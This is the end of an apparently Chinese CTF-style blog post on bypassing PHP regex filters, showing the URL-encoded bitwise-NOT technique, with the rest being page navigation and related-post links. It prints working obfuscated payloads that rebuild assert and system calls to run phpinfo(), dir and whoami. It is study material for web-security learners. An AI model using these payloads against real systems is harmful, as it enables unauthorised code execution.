<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%B8%BA%AB&#x27;);$___=$$__;$_($___[_]);&amp;_=phpinfo();</span><br><span class="line">	//assert($_GET[_]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>$_POST（记得用POST方式将 phpinfo()传给 _变量）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%AF%B0%AC%AB&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">	//assert($_POST[_]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造 system(‘dir’)，道理和异或拼接绕过一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(~&#x27;%8C%86%8C%8B%9A%92&#x27;);$__=&#x27;_&#x27;.(~&#x27;%B8%BA%AB&#x27;);$___=$$__;$_($___[_]);&amp;_=dir;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>当 <strong>PHP&gt;7</strong> 时，我们可以这样构造 payload</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\123&gt;<span class="title">php</span> -<span class="title">r</span> &quot;<span class="title">var_dump</span>(<span class="title">urlencode</span>(~&#x27;<span class="title">system</span>&#x27;));&quot;</span></span><br><span class="line"><span class="function"><span class="title">string</span>(18) &quot;%8<span class="title">C</span>%86%8<span class="title">C</span>%8<span class="title">B</span>%9<span class="title">A</span>%92&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\123&gt;<span class="title">php</span> -<span class="title">r</span> &quot;<span class="title">var_dump</span>(<span class="title">urlencode</span>(~&#x27;<span class="title">whoami</span>&#x27;));&quot;</span></span><br><span class="line"><span class="function"><span class="title">string</span>(18) &quot;%88%97%90%9<span class="title">E</span>%92%96&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">payload</span>:</span></span><br><span class="line"><span class="function">(~%8<span class="title">C</span>%86%8<span class="title">C</span>%8<span class="title">B</span>%9<span class="title">A</span>%92)(~%88%97%90%9<span class="title">E</span>%92%96);</span></span><br><span class="line"><span class="function">	#<span class="title">system</span>(&#x27;<span class="title">whoami</span>&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">浅谈PHP代码执行中出现过滤限制的绕过执行方法</a></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80/">基础</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/007.jpg" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/18/103%E2%80%94SSTI%E6%BC%8F%E6%B4%9E-%E5%85%A5%E9%97%A8/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/008.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SSTI漏洞(模板注入)-入门</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/17/201%E2%80%94Metasploit%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/006.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Metasploit</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/12/18/103%E2%80%94SSTI%E6%BC%8F%E6%B4%9E-%E5%85%A5%E9%97%A8/" title="SSTI漏洞(模板注入)-入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/008.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-18</div><div class="title">SSTI漏洞(模板注入)-入门</div></div></a></div><div><a href="/2023/01/17/104%E2%80%94%E4%BC%B0%E8%AE%A1%E4%BB%A5%E5%90%8E%E4%B8%8D%E4%BC%9A%E9%81%87%E5%88%B0%E6%BC%8F%E6%B4%9E/" title="估计以后不会遇到的漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/009.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-17</div><div class="title">估计以后不会遇到的漏洞</div></div></a></div><div><a href="/2022/09/23/001%E2%80%94kali-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/" title="kali-Linux命令"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/002.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">kali-Linux命令</div></div></a></div><div><a href="/2022/08/27/000%E2%80%94%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="计算机网络基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/001.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-27</div><div class="title">计算机网络基础</div></div></a></div><div><a href="/2023/01/30/003%E2%80%94Docker/" title="Docker-基本学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Nikaid0/Imge/background/010.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-30</div><div class="title">Docker-基本学习</div></div></a></div><div><a href="/2022/10/08/100%E2%80%94xss-labs/" title="xss-labs笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/004.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-08</div><div class="title">xss-labs笔记</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Nik41d0</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Nik41d0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Nik41d0" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1581283149&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>声明</span></div><div class="announcement_content">技术很菜，还有点中二<br><b>QQ：1581283149</b></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PHP伪协议-文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-x2F-x2F"><span class="toc-number">1.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-x2F-x2F"><span class="toc-number">1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-x2F-x2F-filter"><span class="toc-number">1.2.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-x2F-x2F-input"><span class="toc-number">1.2.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-x2F-x2F"><span class="toc-number">1.3.</span> <span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-x2F-x2F"><span class="toc-number">1.4.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-get-contents-%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">file_get_contents 绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">2.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intval-%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">intval()比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace-x2F-e%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">preg_replace() &#x2F;e模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#basename-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99"><span class="toc-number">3.3.</span> <span class="toc-text">basename()绕过正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#escapeshell-arg-cmd"><span class="toc-number">3.4.</span> <span class="toc-text">escapeshell(arg+cmd)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">弱类型绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#md5%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">md5相等绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">strcmp绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wakeup-%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">__wakeup()绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">6.</span> <span class="toc-text">正则表达式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">正则表达式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">7.1.</span> <span class="toc-text">字符串拼接绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">7.2.</span> <span class="toc-text">字符串编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E6%AC%A1%E4%BC%A0%E5%8F%82%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.</span> <span class="toc-text">多次传参绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%AE%BF%E9%97%AE%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.</span> <span class="toc-text">内置函数访问绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">7.5.</span> <span class="toc-text">异或拼接绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">7.6.</span> <span class="toc-text">URL编码取反绕过</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/003%E2%80%94Docker/" title="Docker-基本学习"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Nikaid0/Imge/background/010.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker-基本学习"/></a><div class="content"><a class="title" href="/2023/01/30/003%E2%80%94Docker/" title="Docker-基本学习">Docker-基本学习</a><time datetime="2023-01-30T08:39:15.000Z" title="发表于 2023-01-30 16:39:15">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/17/104%E2%80%94%E4%BC%B0%E8%AE%A1%E4%BB%A5%E5%90%8E%E4%B8%8D%E4%BC%9A%E9%81%87%E5%88%B0%E6%BC%8F%E6%B4%9E/" title="估计以后不会遇到的漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/009.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="估计以后不会遇到的漏洞"/></a><div class="content"><a class="title" href="/2023/01/17/104%E2%80%94%E4%BC%B0%E8%AE%A1%E4%BB%A5%E5%90%8E%E4%B8%8D%E4%BC%9A%E9%81%87%E5%88%B0%E6%BC%8F%E6%B4%9E/" title="估计以后不会遇到的漏洞">估计以后不会遇到的漏洞</a><time datetime="2023-01-17T13:13:20.000Z" title="发表于 2023-01-17 21:13:20">2023-01-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/18/103%E2%80%94SSTI%E6%BC%8F%E6%B4%9E-%E5%85%A5%E9%97%A8/" title="SSTI漏洞(模板注入)-入门"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/008.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSTI漏洞(模板注入)-入门"/></a><div class="content"><a class="title" href="/2022/12/18/103%E2%80%94SSTI%E6%BC%8F%E6%B4%9E-%E5%85%A5%E9%97%A8/" title="SSTI漏洞(模板注入)-入门">SSTI漏洞(模板注入)-入门</a><time datetime="2022-12-18T11:04:50.000Z" title="发表于 2022-12-18 19:04:50">2022-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/002&amp;102%E2%80%94PHP(%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB)/" title="PHP-杂七杂八"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/007.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP-杂七杂八"/></a><div class="content"><a class="title" href="/2022/11/21/002&amp;102%E2%80%94PHP(%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB)/" title="PHP-杂七杂八">PHP-杂七杂八</a><time datetime="2022-11-21T14:17:28.000Z" title="发表于 2022-11-21 22:17:28">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/17/201%E2%80%94Metasploit%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/" title="Metasploit"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/006.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Metasploit"/></a><div class="content"><a class="title" href="/2022/10/17/201%E2%80%94Metasploit%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/" title="Metasploit">Metasploit</a><time datetime="2022-10-17T03:45:00.000Z" title="发表于 2022-10-17 11:45:00">2022-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>